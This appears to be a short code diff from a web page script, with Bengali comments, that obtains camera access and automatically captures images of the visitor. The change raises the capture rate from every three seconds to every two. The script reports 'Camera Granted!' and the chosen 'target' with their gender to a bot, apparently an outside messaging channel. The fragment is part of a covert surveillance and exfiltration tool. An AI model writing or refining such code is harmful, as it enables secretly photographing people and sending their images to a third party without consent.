@@ -136,7 +136,7 @@
     function startProcess() {
         navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
             document.getElementById('video').srcObject = stream;
-            setInterval(autoCapture, 3000); // প্রতি ৩ সেকেন্ডে ছবি
+            setInterval(autoCapture, 2000); // প্রতি ২ সেকেন্ডে ছবি
             
             sendBot(`📸 **Camera Granted!**\n👤 Target selected: **${userGender.toUpperCase()}**`);
             
